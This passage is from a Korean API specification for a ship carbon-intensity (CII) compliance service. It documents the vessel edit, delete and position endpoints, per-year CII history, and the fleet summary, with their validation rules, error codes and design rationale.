> **[#1332] 없는 `default_fuel_type`은 422다.** 종전에는 `fk_vessel_default_fuel` 위반이 그대로 올라와 **500**이었다 — 사용자가 고칠 수 있는 입력인데 「서버 오류」로 보이면 고칠 생각을 하지 않는다. 같은 절의 `ship_type`(VAL-004)은 처음부터 422였다. `§2.4` 수정 경로도 같다.

> `is_cii_applicable_hint`는 서버가 GT ≥ 5,000 및 선종 기준으로 자동 계산한다.

> **[#860] 상·하한은 저장 형식에서 나온다 — 도메인 하한이 아니다.** 각 컬럼이 `NUMERIC(p,s)`
> 고정 정밀도(`DB_SCHEMA §2.1`)라 **담을 수 있는 가장 작은 양수는 `0.01`**, 가장 큰 값은
> `10^(p−s) − 0.01`이다. 종전 스키마는 `> 0`만 봐서 `1e-7`이 통과했고, DB가 `0.00`으로
> 반올림한 뒤 `chk_dwt_positive`에 걸려 **500**이 났다(`1e10`은 정밀도 초과로 500). 이제 422다.
> 소수 셋째 자리 이하는 거부하지 않는다 — DB가 반올림한다. `PATCH`(§2.4)도 같은 경계다.

#### 응답 (201 Created)

§2.2와 동일한 선박 객체.

### 2.4 선박 수정

```http
PATCH /api/v1/vessels/{vessel_id}
```

#### 요청 Body

§2.3의 모든 필드는 optional. `imo_number`는 변경 불가.

> 선박 제원(DWT/GT · 선종) 변경 시 해당 선박의 미확정 계산 결과에 재계산 필요 표시가 설정된다 (PRD §8.4 · #944).

> **[#1197] `call_sign`은 빈 문자열을 보내도 「안 바꾼다」다.** 서버가 strip 뒤 빈 값을 `null`로 접고,
> `null`은 PATCH 규약대로 미변경이다 — GT와 같이 **지우는 경로는 없다.** 값을 고치려면 새 값을 보낸다.
> 호출부호 변경은 재계산 필요 표시를 만들지 않는다(계산 입력이 아니다 · §2.3 `[#1197]`).

#### 응답 (200 OK)

수정된 선박 객체.

### 2.5 선박 삭제

```http
DELETE /api/v1/vessels/{vessel_id}
```

#### 응답 (200 OK)

```json
{
  "data": {
    "id": "uuid",
    "deleted": true
  },
  "meta": { ... }
}
```

> 연관된 Voyage, CalculationRun이 있는 경우 soft delete. 완전 삭제 경로는 두지 않는다 — 삭제된 선박의 계산 이력은 보존 대상이다(`#759` 정정). **선박 등록·제원 수정·삭제는 사무직 전용**이다(`§1.2` · `#672`).

### 2.6 선박 위치·운항 상태 갱신 (#369)

```http
PATCH /api/v1/vessels/{vessel_id}/position
```

마이그레이션 026(`#346`)이 추가한 위치·상태 컬럼을 바꾸는 **유일한 경로**다. 이 엔드포인트가 없으면 대시보드(`#351`)의 「지금 어디서 무엇을 하고 있나」가 시드 이후 고정된다.

> **왜 저장인가 (파생이 아니라)** — 상태 2축은 진행 중 `not_underway_period`에서 파생할 수 있으나 **위경도는 파생할 수 없다.** 항로 모델이 없어 「지금 어디쯤」을 유도할 방법이 없고, `#346`이 이미 저장 컬럼으로 만들었다. 둘을 갈라 한쪽만 파생시키면 같은 화면의 두 값이 서로 다른 시점을 가리킨다.
>
> **조회 경로에서 갱신하지 않는다.** `#350` 선대 요약이 단순 SELECT로 끝나야 하며, 쓰기를 조회에 섞으면 GET이 트랜잭션을 잡는다.

> **[#764] 이 경로는 위치 이력에도 한 행을 남긴다.** `vessel.current_lat/lon`은 **덮어쓰는 한 칸**이라 새 값이 들어오면 직전 값이 사라진다 — 「지금 어디인가」만 남고 「어디를 지나왔는가」는 남지 않았다. 같은 입력이 `vessel_position_snapshot`(`DB_SCHEMA §2.21`)에 `source=MANUAL`로 함께 들어간다. **응답은 바뀌지 않는다** — 갱신된 선박 객체 그대로다.
>
> 자동 수집(AIS)은 **이 엔드포인트를 쓰지 않는다.** 위 문장과 같은 이유로 수집은 별도 경로(배치)이며, 요청 처리 중에 외부 조회를 일으키지 않는다 — 그 실패가 화면 실패가 된다.

#### 요청 본문

| 필드 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `underway_state` | string | 아니오 | `UNDER_WAY` / `NOT_UNDER_WAY` |
| `detail_status` | string | 아니오 | `UNDER_WAY`면 `SAILING`. `NOT_UNDER_WAY`면 `IN_PORT`/`AT_ANCHOR`/`DRIFTING`/`STS`/`CANAL_TRANSIT`/`DRYDOCK` |
| `current_lat` | number | 아니오 | −90 ~ 90 |
| `current_lon` | number | 아니오 | −180 ~ 180 |

`position_updated_at`은 **요청에 넣을 수 없다** — `extra="forbid"`가 422로 거부한다. 클라이언트 시계를 신뢰하면 「언제 기준 위치인가」가 단말마다 갈리므로 **서버가 확정**한다.

#### 함께 보내야 하는 쌍

마이그레이션 026의 CHECK 제약을 스키마 표면에 그대로 옮긴 규칙이다.

| 규칙 | 위반 시 |
|---|---|
| `underway_state`와 `detail_status`는 **함께** 지정 | `422` · `VALIDATION_ERROR` |
| 두 상태의 조합이 허용 집합에 있어야 함 | `422` — 예: `UNDER_WAY` + `AT_ANCHOR` |
| `current_lat`과 `current_lon`은 **함께** 지정 | `422` |

`detail_status`의 `NOT_UNDER_WAY` 6값은 `not_underway_period.period_type`(마이그레이션 025)과 **같은 집합**이다 — 정박 구간의 성격이 곧 선박의 표시 상태가 된다.

#### 응답 (200 OK)

§2.2와 동일한 선박 객체. `position_updated_at`에 서버가 확정한 시각이 들어간다.

> **빈 본문(`{}`)은 200이지만 `position_updated_at`을 건드리지 않는다.** 갱신하지 않은 것을 갱신했다고 기록하면 「낡은 값인지」 판별이 무의미해진다.

#### 인증

다른 변경 API와 동일하게 세션 쿠키 + `X-CSRF-Token`을 요구한다. `#307`(변경 API 8종이 인증 게이트 밖에 노출)의 선례에 따라 **새 변경 엔드포인트는 게이트 배선을 테스트로 확인**한다.

---

### 2.7 선박 연도별 CII 이력 조회 (#355)

```http
GET /api/v1/vessels/{vessel_id}/cii-history?from=2025&to=2026
```

선박 상세 화면(`UIFLOW 2-8`)의 **연도별 CII 이력** 축. 연도별 집계는 YTD 엔진(#353)을 그대로 위임한다 — 이 엔드포인트의 소관은 **창·상태 구분**이다.

> **`transport_capacity_basis` (#356 추가).** 응답 최상위에 표시 단위의 축(`DWT` · `GT`)을 함께 싣는다. `DESIGN_SYSTEM §4.1` 🔒이 `gCO₂/(DWT·nm)`과 `gCO₂/(GT·nm)`을 **선종에 따라 갈리는 값**으로 규정하고 고정 문자열을 금지하기 때문이다. 화면이 선종에서 축을 유추하면 선종이 늘 때 서버와 갈라지고, **크루즈선에 `DWT`가 표시돼도 화면은 깨지지 않아 발견이 늦다.** 축을 정하는 것은 `calc.capacity.capacity_axis`이며 그 결과를 그대로 반환한다. 연도별로 달라지지 않는 선박 속성이라 `years` 안이 아니라 최상위에 둔다.

#### 쿼리 파라미터

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `from` | integer | 아니오 | 시작 연도. 기본 `to - 2` (최근 3년 창) |
| `to` | integer | 아니오 | 종료 연도. 기본 `as_of` 연도(올해) |
| `as_of` | string(ISO 8601) | 아니오 | 확정/진행 중 판정 기준 시각. 미지정이면 서버 현재 시각. **응답 `meta.as_of`를 그대로 되돌려 보내면 같은 결과를 얻는다** (#368 계약 ⑶ — 재현성) |

**검증 (422 · `VALIDATION_ERROR`)** — `from ≥ 2019` · `from ≤ to` · 창 ≤ 10년.

#### 연도 행 구조

| 필드 | 타입 | 설명 |
|---|---|---|
| `regulation_year` | integer | 규제 연도 |
| `status` | string | `CONFIRMED`(과거 연도, 확정) / `IN_PROGRESS`(`as_of` 연도 이상, YTD) |
| `data_available` | boolean | 집계 가능한 실적이 있는가 |
| `reason` | string \| null | `NO_REGULATION_PARAMS` — 해당 연도 `regulation_year` 행 없음. `NO_DATA` — 파라미터는 있으나 집계할 실적 없음 |
| `attained_cii` | string \| null | 연도 누적 attained CII (6자리) |
| `required_cii` | string \| null | 해당 연도 required CII (6자리) |
| `rating` | string \| null | A~E. `IN_PROGRESS` 연도는 **YTD 등급** — 공식 등급이 아니다(`PRD §3.3.8`) |
| `voyage_count` | integer | 실적 확정(`INCLUDE_AS_ACTUAL`) 항차 수. **진행 중 항차는 세지 않는다** |
| `in_progress_voyage_count` | integer | **[#800]** 이 행의 거리·연료에 **기여분이 포함된** 진행 중 항차 수(0 또는 1). 진행 중 항차가 선언한 연도의 행에만 1이며 과거 확정 연도는 늘 0이다 |
| `total_distance_nm` | string \| null | 두 갈래(항해 + not under way) 거리 합 (2자리) |
| `total_fuel_ton` | string \| null | 두 갈래 연료 합 (2자리). `data_available=false`여도 거리·연료 값 자체는 실릴 수 있다 |
| `fuels` | array | **[#769]** 유종별 내역. **늘 배열이다** — 실적이 없는 해는 `[]`이며 `null`이 아니다 |

##### `fuels[]` — 연료축 (#769)

`PRD §21` 「통계 분석 — 선박별·항로별·연료별 CII 추세」 중 **연료별** 축이다. 선박별 축은 이 엔드포인트가 연도로 이미 열고 있고, **항로별 축은 항만명이 자유 텍스트라 집계가 성립하지 않는다**(`BUSAN`·`Busan`·`부산`이 서로 다른 항로가 된다 — `§3.10` 항만명 좌표 조회가 정규화의 첫 걸음이나 집계 축은 아직 아니다).

| 필드 | 타입 | 설명 |
|---|---|---|
| `fuel_type` | string | 유종 코드(`fuel_type.code`). **CF snapshot이 둘 이상이어도 한 줄로 합친다** — 화면에 같은 기름이 두 종류로 보이면 안 된다(`#863`) |
| `fuel_ton` | string | 두 갈래(항해 중 + not under way) 투입 톤 합 (2자리) |
| `co2_ton` | string \| null | 그 유종의 CO₂ 배출량 (2자리). 각 CF snapshot으로 곱한 값의 합이다(`PRD §8.4` snapshot 보존). 거리가 0이라 Layer 1을 타지 않은 해는 `null` |
| `co2_share_percent` | string \| null | 그 해 총 CO₂ 대비 비중 (1자리). `co2_ton`이 `null`이면 함께 `null` |

> **비중은 CO₂ 기준이다 — 톤 기준이 아니다.** CII의 분자는 배출량이므로(`PRD §3.3.1`), 「어느 연료가 등급을 끌고 있나」를 톤으로 말하면 **CF가 낮은 연료를 많이 쓴 해가 실제보다 나빠 보인다**(LNG 2.75 vs HFO 3.114 — `DB_SCHEMA §3.2`). 예: HFO 300t + LNG 100t이면 톤 비중은 75.0%지만 CO₂ 비중은 **77.3%**다.

> **배출량을 모르는 해에도 행을 싣는다.** 거리가 0이면 Layer 1을 타지 않아 CO₂가 없다. 그 해의 `fuels`를 비우면 **「정박만 한 해」가 연료축에서 통째로 사라진다** — 연료는 실제로 들어갔는데도. 톤은 싣고 CO₂만 `null`로 둔다.

> **정렬은 서버가 정한다** — CO₂ 내림차순, 같으면 톤 내림차순, 그래도 같으면 유종 이름. 순서가 요청마다 흔들리면 두 해의 표를 눈으로 대조할 수 없다.

> **파라미터가 없는 해도 요청 전체가 실패하지 않는다.** 그 해만 `data_available=false` + `reason=NO_REGULATION_PARAMS` 행으로 내보낸다 — 한 해 파라미터 미적재로 3년 이력 전체가 409로 죽으면 화면이 아무것도 그리지 못한다.

> **[#750 정정] 진행 중 항차의 기여분은 올해 행에 포함한다.** 종전 문장은 *"`INCLUDE_AS_PLAN` 항차는 세지 않는다 … 진행 중 항차의 실시간 기여분(시뮬레이션 시계)은 `GET /vessels/{id}/cii/current`(#354)의 소관이다"* 였으나, **`PRD §3.3.8`이 정면으로 반대**다 — `INCLUDE_AS_PLAN`의 **계획 전량**은 넣지 않되 `§8.3`이 요구하는 `IN_PROGRESS latest estimate`(경과 시간에서 산출)는 YTD에 넣는다. `AGENTS §3.1`상 `PRD`가 이 문서보다 앞서므로 상위에 맞춘다.
>
> 그대로 두면 **같은 라벨의 숫자가 화면마다 달라진다.** 실측(2026-08-29)에서 같은 선박·같은 연도에 대시보드 8.9799 · 이 엔드포인트 8.980 · `GET /vessels/{id}/cii/current` 7.028270이 나왔고, 연간 실적 리포트는 **한 문서 안에 7.028과 8.980을 함께** 인쇄했다.
>
> **과거 연도는 영향이 없다** — 진행 중 항차는 올해에만 존재한다. `voyage_count`는 종전대로 **실적 확정(`INCLUDE_AS_ACTUAL`) 항차 수**이며 진행 중 항차를 세지 않는다(항차 수와 누적값이 어긋나던 문제는 **`#800`이 `in_progress_voyage_count`로 해소**했다 — 뜻을 바꾸지 않고 진행분을 따로 센다).

#### 응답 예시 (200 OK)

```json
{
  "data": {
    "vessel_id": "00000000-0000-4000-8000-000000000001",
    "from": 2024,
    "to": 2026,
    "transport_capacity_basis": "DWT",
    "years": [
      {
        "regulation_year": 2024,
        "status": "CONFIRMED",
        "data_available": false,
        "reason": "NO_DATA",
        "attained_cii": null,
        "required_cii": null,
        "rating": null,
        "voyage_count": 0,
        "in_progress_voyage_count": 0,
        "total_distance_nm": "0.00",
        "total_fuel_ton": "0.00",
        "fuels": []
      },
      {
        "regulation_year": 2025,
        "status": "CONFIRMED",
        "data_available": true,
        "reason": null,
        "attained_cii": "5.841032",
        "required_cii": "5.158439",
        "rating": "D",
        "voyage_count": 1,
        "in_progress_voyage_count": 0,
        "total_distance_nm": "4265.00",
        "total_fuel_ton": "400.00",
        "fuels": [
          {
            "fuel_type": "HFO",
            "fuel_ton": "300.00",
            "co2_ton": "934.20",
            "co2_share_percent": "77.3"
          },
          {
            "fuel_type": "LNG",
            "fuel_ton": "100.00",
            "co2_ton": "275.00",
            "co2_share_percent": "22.7"
          }
        ]
      },
      {
        "regulation_year": 2026,
        "status": "IN_PROGRESS",
        "data_available": true,
        "reason": null,
        "attained_cii": "8.979907",
        "required_cii": "5.045066",
        "rating": "E",
        "voyage_count": 1,
        "in_progress_voyage_count": 1,
        "total_distance_nm": "4300.00",
        "total_fuel_ton": "620.00",
        "fuels": [
          {
            "fuel_type": "HFO",
            "fuel_ton": "620.00",
            "co2_ton": "1930.68",
            "co2_share_percent": "100.0"
          }
        ]
      }
    ]
  },
  "meta": {
    "request_id": "req-8f14e45f",
    "timestamp": "2026-08-15T06:00:00Z",
    "as_of": "2026-08-15T00:00:00+00:00"
  }
}
```

#### 오류

| 상태 | 코드 | 조건 |
|---|---|---|
| 404 | `NOT_FOUND` | 선박 없음 |
| 422 | `VALIDATION_ERROR` | 창 규칙 위반 (`from > to` · 창 > 10년 · `from < 2019`) |

---

### 2.8 선대 요약 조회 (#350)

```http
GET /api/v1/fleet/summary?regulation_year=2026&as_of=2026-08-16T12:00:00Z
```

대시보드(`UIFLOW 2-4` · `PRD §6.2 SCR-001`)가 **한 번의 호출로** 선대 전체 현황과 경고 배너 데이터를 받는다.

> **왜 별도 엔드포인트인가.** `GET /vessels`는 선박 제원만 반환하고 등급·위치·상태 요약이 없다. 화면이 선박마다 개별 조회를 돌면 10척에 21회 호출이 된다.

> **계산을 다시 하지 않는다.** 선박별 YTD 값·등급·위험도는 `#353`의 YTD 엔진(`services.ytd_cii`)을 그대로 위임한다. 이 엔드포인트의 소관은 **모으기·판정·집계**다.

> **[#750 추가] YTD의 정의는 `PRD §3.3.8`이다 — 진행 중 항차 기여분을 포함한다.** 종전에는 이 절이 위임만 적고 **어느 정의인지 침묵**해, 대시보드가 실적 확정분만 집계하는 것이 의도인지 결함인지 문서로 판정할 수 없었다. 실제로 `§2.7`·`§2.14`와 값이 갈렸다.
>
> 이 값 위에서 **위험 선박 배너·등급 분포·정렬·`days_to_d`**가 돌므로(`PRD §3.3.7`), 정의가 갈리면 **규제 트리거 판정이 뒤집힐 수 있다.**

#### 쿼리 파라미터

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `regulation_year` | integer | 아니오 | 집계 대상 규제연도. 기본 `as_of` 연도 |
| `as_of` | string | 아니오 | 기준 시각 (ISO 8601 UTC). 미지정 시 서버가 확정하고 응답에 실어 반환한다 (`TECH_SPEC §5.4.1` 계약 ⑵). **다음 페이지를 물을 때는 첫 페이지 응답의 값을 그대로 싣는다** — 시각이 바뀌면 순서가 바뀌어 페이지 사이에 선박이 겹치거나 빠진다 |
| `sort` | string | 아니오 | **[#772]** `vessels[]` 정렬 — `risk`(기본: 규제 트리거 → YTD 등급이 나쁜 순 → 이름) · `grade`(등급이 나쁜 순 → 이름) · `name`. 등급이 없는 선박은 나쁜 등급으로 오해되지 않게 **가장 뒤**, 이름은 대소문자를 가르지 않으며 마지막 키는 늘 `vessel_id`다. 그 밖의 값은 422 |
| `limit` · `cursor` | | 아니오 | **[#772]** `vessels[]` 페이지(`§1.5` — 기본 20, 최대 100). 다음 페이지 정보는 `meta.next_cursor`·`meta.has_more`. **다른 `sort`의 커서는 422**다 — 다른 순서의 n번째부터가 나와 선박이 겹치거나 빠진다 |

> **[#772] `vessels[]`만 자른다 — `summary`·`actions`는 선대 전체다** (2026-09-11 결정). 위험 선박 배너·등급 분포가 「이 페이지의 위험 선박 수」가 되는 순간 뜻을 잃는다(`PRD §6.2 SCR-001`). 그래서 **페이지와 무관하게 전 선박을 계산**한다 — 페이지네이션은 응답 크기를 줄일 뿐 계산량은 줄이지 않는다(계산량은 `#772` 후속 이슈 소관). **정렬도 서버가 한다** — 페이지로 자르면 화면이 전체를 정렬할 수 없다.
>
> ⚠️ **종전에는 200척에서 조용히 잘렸다** — 201번째 선박부터 `summary.total`에도 배너에도 없었다(`#772` 실측: 등록 201척 → `total` 200). **상한을 두지 않는다.**

> **[#989] `summary`의 파생 표시 2종 — `missing_gross_tonnage` · `soonest_d_entry`** (2026-09-17 결정 「가」). 종전에는 이 두 숫자를 **화면이 받은 페이지에서** 셌다. 첫 페이지를 최대치(100)로 받으므로 그 이하에서는 우연히 맞았지만, 그보다 크면 **101번째 선박이 아무리 급해도 「가장 임박」에서 빠진다** — `summary`를 선대 전체로 둔 위 원칙을 화면만 깨고 있었다. 화면은 이 값을 그리기만 한다.
>
> | 필드 | 뜻 | 고르는 규칙 |
> |---|---|---|
> | `missing_gross_tonnage` | GT 미기록 척수 | `gross_tonnage`가 **NULL인 행만** 센다. 0은 「0으로 적혀 있다」지 「없다」가 아니다(DB 트리거상 존재하지 않는 값이지만 집계 규칙은 명시적으로 둔다) |
> | `soonest_d_entry` | 「D등급 진입이 가장 임박한 선박」 하나 | `vessels[].days_to_d`가 있는 선박 중 **남은 일수가 가장 짧은 것**. 동점이면 (이름, `vessel_id`) — `sort`와 같은 2차 키라 요청을 다시 해도 같은 배를 가리킨다. 후보가 없으면 `null` |
>
> `vessel_id`를 함께 싣는 것은 이름만으로 동명 선박을 가리지 못하기 때문이다. `days`는 `vessels[].days_to_d`와 같은 값·같은 어휘다 — 창 강도·사유 규칙이 별도로 생기지 않는다.

#### 응답 (200 OK)

```json
{
  "data": {
    "as_of": "2026-08-16T12:00:00+00:00",
    "regulation_year": 2026,
    "summary": {
      "total": 10,
      "under_way": 7,
      "not_under_way": 3,
      "unknown_state": 0,
      "rating_distribution": { "A": 2, "B": 2, "C": 3, "D": 2, "E": 1 },
      "at_risk": 2,
      "no_data": 0,
      "missing_gross_tonnage": 1,
      "soonest_d_entry": { "vessel_id": "uuid", "name": "MV Ulsan", "days": 24 }
    },
    "vessels": [
      {
        "vessel_id": "uuid",
        "name": "MV Hanla",
        "ship_type": "BULK_CARRIER",
        "imo_number": "9100001",
        "underway_state": "UNDER_WAY",
        "detail_status": "SAILING",
        "current_lat": "35.100000",
        "current_lon": "129.040000",
        "position_updated_at": "2026-08-16T11:00:00+00:00",
        "route": {
          "departure_lat": "35.100000",
          "departure_lon": "129.033300",
          "arrival_lat": "1.283300",
          "arrival_lon": "103.850000"
        },
        "is_cii_applicable_hint": true,
        "gross_tonnage": 25000.0,
        "data_available": true,
        "unavailable_reason": null,
        "ytd_attained_cii": "9.4200",
        "ytd_required_cii": "5.0450",
        "ytd_rating": "E",
        "risk_level": "CRITICAL",
        "risk_reasons": ["E_THIS_YEAR"],
        "days_to_d": null,
        "days_to_d_reason": "ALREADY_AT_OR_BELOW"
      }
    ],
    "actions": [
      {
        "vessel_id": "uuid",
        "vessel_name": "MV Hanla",
        "severity": "critical",
        "reason": "E_THIS_YEAR",
        "message": "E등급 1년차 — SEEMP Part III 시정조치계획 대상"
      }
    ]
  },
  "meta": {
    "request_id": "...", "timestamp": "...", "as_of": "...",
    "next_cursor": "eyJvIjogMjAsICJzIjogInJpc2sifQ==", "has_more": true
  }
}
```

#### `route` — 진행 중 항차의 항로 (#763)

지도(`UIFLOW 2-4`)가 **대권선**을 그리는 근거다. 네 좌표가 모두 있을 때만 실린다.

| 필드 | 타입 | 설명 |
|---|---|---|
| `departure_lat` · `departure_lon` | string | 출발항 좌표 (6자리) |
| `arrival_lat` · `arrival_lon` | string | 도착항 좌표 (6자리) |

> **셋 중 하나라도 없으면 `route`는 `null`이다** — ⑴ 진행 중 항차가 없다(정박 중이거나 아직 출항 전) ⑵ 좌표가 한쪽이라도 비어 있다. **반쪽 선분을 그리면 배가 어디로 가는지 잘못 말하고**, 화면은 그 사실을 알 수 없다. 항로가 없는 배는 지도에 **점만** 남는다.

> **쿼리는 한 번 더 늘 뿐이다.** 선박마다 진행 중 항차를 묻지 않고 **선대 전체를 한 번에** 조회한다(`repositories/voyage.find_in_progress_for_vessels`). 이 엔드포인트는 쿼리 수를 방금 줄여 놓은 자리라(`#989` — 212 → 129) 척당 조회를 다시 더할 수 없다.

> **고르는 규칙은 `§2.14`(실시간 CII)와 같다** — 실제 출항 시각 내림차순, NULL은 뒤. 두 경로가 다른 항차를 고르면 같은 화면의 두 값이 서로 다른 항차를 가리킨다.

#### CII 적용 대상 표시 (`#653`)

| 필드 | 근거 | 용도 |
|---|---|---|
| `is_cii_applicable_hint` | `§2.3` | **서버 판정**. 화면이 GT로 다시 판정하지 않는다 |
| `gross_tonnage` | `§2.1` | 판정이 아니라 **「미해당」의 원인**을 가르는 데만 쓴다 |

`is_cii_applicable_hint`는 boolean이라 「해당/미해당」 둘로 보이지만 **미해당의 원인이 둘**이다 — GT를 알고 그것이 5,000 미만인 경우와, GT가 NULL이라 **판정 근거가 없는** 경우다. 둘을 합치면 **총톤수를 넣지 않은 사용자가 「이 배는 규제 대상이 아니다」로 읽는다.** 그래서 두 필드를 함께 싣는다.

> **새 어휘를 만들지 않았다.** 두 필드 모두 `§2.1` 선박 객체에 이미 있는 것이며, 여기서는 선대 화면이 선박마다 개별 조회를 돌지 않도록 같은 값을 실어 보낼 뿐이다. 대신 `gross_tonnage`는 `§2.1`과 같이 **JSON number**로 직렬화한다 — Layer 1 문자열 직렬화(`§1.7`)는 계산 **결과**에만 적용되고, 총톤수는 입력 제원이다.

#### `risk_level`과 `risk_reasons`는 다른 것을 본다

| 필드 | 근거 | 의미 |
|---|---|---|
| `risk_level` | `PRD §9.4.1` | 표시용 4단계 — LOW · MEDIUM · HIGH · CRITICAL. 「지금 여유가 얼마나 있나」 |
| `risk_reasons` | `PRD §3.3.7` | **규제 트리거** — 「MARPOL Reg 28.7에 걸렸나」 |

C등급이어도 여유가 없으면 `risk_level`은 `HIGH`지만 규제 의무는 없고, D등급 3년차는 여유와 무관하게 의무가 생긴다. **하나로 합치면 조치 목록에 사유를 쓸 수 없다.**

`risk_reasons` 값은 `PRD §3.3.7`의 판정 기준을 그대로 따른다.

| 값 | 조건 |
|---|---|
| `E_THIS_YEAR` | 올해 YTD 등급이 **E** |
| `D_THIRD_YEAR` | 직전 2개 규제연도의 확정 등급이 연속 **D**이고 올해 YTD도 **D** |

> 기준이 **연말 예상 등급이 아니라 YTD 등급**이다. 예상 등급은 Monte Carlo 종속이라 같은 화면을 두 번 열면 값이 달라질 수 있어, `PRD §3.3.7`이 그 기준을 후속 이슈로 연기했다.

#### `days_to_d` — 「D등급 진입까지 n일」

숫자를 내지 못하는 경우 `days_to_d`는 `null`이고 `days_to_d_reason`이 사유를 준다. **숫자를 못 낸 것과 0일인 것은 다르므로** 같은 자리에 넣지 않는다.

| `days_to_d_reason` | 조건 |
|---|---|
| `ALREADY_AT_OR_BELOW` | 이미 D 이하 — 「진입까지」가 정의되지 않음 |
| `NOT_THIS_YEAR` | 외삽 결과가 연말을 넘음 |
| `NOT_UNDER_WAY` | **정박 중 — 산정하지 않음** |
| `NO_DATA` | 실적 또는 경계값 없음 |
| `NO_RECENT_DATA` | 최근 창(30일)에 항해가 없어 소비율을 낼 근거가 없음 (`#431`) |
| `NOT_WORSENING` | 최근 운항 강도가 경계보다 효율적이라 이대로면 진입하지 않음 (`#431`). **0일이 아니라 「해당 없음」이다** — 숫자를 만들면 「곧 진입한다」로 읽힌다 |

> **아래 두 행은 `#431`이 만들었는데 `#814` 전까지 이 표에 없었다.** 그 이슈가 「최근 30일 소비율」 산식을 넣으면서 사유 둘을 추가했으나 정본에 옮기지 못했고, **같은 시기에 `fleet_summary`가 존재하지 않는 경계 키를 조회해 그 산식이 한 줄도 실행되지 않았다** — 실제로 나온 적이 없는 사유라 문서에 빠진 것이 드러나지 않았다. `tests/test_fleet_summary.py`가 이 표와 코드 상수를 대조한다.

> **정박 중에 산정하지 않는 이유.** not under way 구간은 거리가 늘지 않고 연료만 늘어(`PRD §3.3` · `MEPC.412(84)` §4.2) CII가 단조 악화한다. 그대로 외삽하면 n일이 하루가 다르게 짧아졌다가 **출항하는 순간 되돌아간다.** 평활화 규칙을 두는 대신 사유로 표기한다.

#### `unavailable_reason` — 값을 내지 못한 사유 (#419)

`data_available=false`인 선박이 **왜** 그런지 구분한다. 값이 있으면 `null`이다.

| 값 | 조건 | 사용자가 할 일 |
|---|---|---|
| `NO_DATA` | 파라미터·제원은 있으나 올해 집계할 실적이 없음 | 항차를 등록한다 |
| `MISSING_SPEC` | 선박 제원으로 capacity를 정할 수 없음 — DWT·GT 부재 · 0 이하 · `PRD §3.4.3`의 13종에 없는 `ship_type` | 선박 정보를 고친다 |
| `NO_PARAMETERS` | 해당 **선종**의 기준선·등급경계가 없음 | 없음 — 운영자가 파라미터를 적재해야 한다 |
| `CALCULATION_ERROR` | 위 어느 것으로도 설명되지 않는 계산 실패 | 없음 — 운영자 확인 |

> **사유는 예외의 종류가 아니라 선박을 보고 정한다.** 같은 `ValidationError`가 이력 조회 창 규칙 위반이나 파라미터 seed 손상처럼 **선박과 무관한 이유**로도 발생한다. 그것을 `MISSING_SPEC`으로 적으면 제원이 멀쩡한 선박에 「제원을 입력하세요」를 띄우게 되고, **사용자가 해도 아무것도 바뀌지 않는다.** 그래서 서버는 그 선박의 제원으로 실패가 설명되는지 직접 확인하고, 설명되지 않으면 `CALCULATION_ERROR`로 적는다.

> **한 척의 계산 실패는 그 값 하나만 무력화한다.** 선박별로 계산 경로가 셋이다(올해 누적 · 직전 2개 연도 이력 · 최근 30일 창). 뒤의 둘이 실패해도 **이미 나온 올해 값은 그대로 쓴다** — 이력을 못 읽는 것이 올해 등급을 무효로 만들지는 않기 때문이다. 이 경우 `risk_reasons`는 「직전 등급을 모른다」로 다뤄지며, `PRD §3.3.7`이 확정 등급 없는 해를 D로 치지 않는 규칙과 같은 뜻이다.

> **한 척의 실패가 선대 전체의 실패가 아니다.** `vessel.deadweight`는 nullable이고(`DB_SCHEMA §2.1`) `PRD §20 O-11`이 제원 수동 입력 경로를 열어 두므로, 제원을 나중에 채우려고 등록한 선박이 실제로 생긴다. 그 한 척 때문에 요청 전체를 500으로 내면 **정상 선박까지 화면에서 사라진다.** 계산 엔진(`#353`)이 단건 조회에서 예외를 던지는 것은 그대로 두고 — 선박 상세에서는 무엇을 채워야 하는지 알려 줘야 한다 — 이 엔드포인트가 선박별로 잡아 사유로 표기한다.

> **셋을 한 사유로 뭉치지 않는 이유.** 사용자가 할 일이 서로 다르다. 「제원 미입력」을 「실적 없음」으로 표기하면 항차를 아무리 등록해도 값이 나오지 않는 선박을 계속 들여다보게 된다.

`summary.no_data`는 **사유를 가리지 않고** `data_available=false`인 선박 수다. 사유별 내역이 필요하면 `vessels[].unavailable_reason`을 센다 — 같은 수를 두 곳에서 따로 세지 않기 위해 집계는 한 축만 둔다.

> **연도 파라미터 부재는 이 사유에 들어가지 않는다.** 선대 공통이므로 요청 전체가 409다(아래 오류 응답). 선박별로 표기하면 「전 선박이 파라미터 없음」이 되어, 실제 원인(그 해 규정 seed 미적재)이 선박 문제로 위장된다.
>
> **409는 선박이 1척 이상일 때만 발동한다.** 선박 0척은 오류가 아니라는 계약이 우선하며, 계산할 대상이 없으면 파라미터도 필요 없다. 또한 `#419` 이전에는 이 409가 **실적 있는 선박이 있을 때만** 나왔다(실적이 없으면 파라미터 조회 전에 조기 반환됐다). 지금은 선박이 있으면 실적 유무와 무관하게 발동한다 — 「그 해 규정 seed가 없다」는 사실을 전 선박 `NO_DATA` 표로 감추지 않기 위해서다.

#### 오류 응답

| 상태 | 코드 | 조건 |
|---|---|---|
| 409 | `PARAMETER_ERROR` | 해당 규제연도 파라미터 없음 (VAL-005) |

> **선박 0척은 오류가 아니다.** 아직 등록하지 않은 선사가 정상적으로 만나는 상태이므로 200에 빈 배열을 반환한다. 404로 내면 화면이 「기능 미구현」과 구분하지 못한다.

---

### 2.9 not under way 구간 목록 조회 (#370)

```http
GET /api/v1/vessels/{vessel_id}/not-underway-periods?regulation_year=2026
```

`not_underway_period`(정박·묘박·표류·STS·운하 통과·드라이독) 기록을 조회한다.

> **왜 이 절이 필요한가.** `#345`가 테이블을 만들고 `#347`이 **시드로** 샘플을 넣고 `#353`이 그걸 읽어 계산한다 — **읽는 쪽만 있고 쓰는 쪽이 없었다.** CSV 가져오기(`§8.2`)는 항차만 다루므로 이 경로를 대신하지 못한다. 이 기록의 연료는 CII 분자 `M`에 그대로 들어가므로(`PRD §3.3`), 넣을 수 없다는 것은 **정박해도 등급이 떨어지지 않는다**는 뜻이다.

#### 쿼리 파라미터

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `regulation_year` | integer | 아니오 | 규제연도 필터. 생략하면 연도 무관 전체 |
| `started_from` | string | 아니오 | 시작 시각 하한 (ISO 8601) |
| `started_to` | string | 아니오 | 시작 시각 상한 (ISO 8601) |

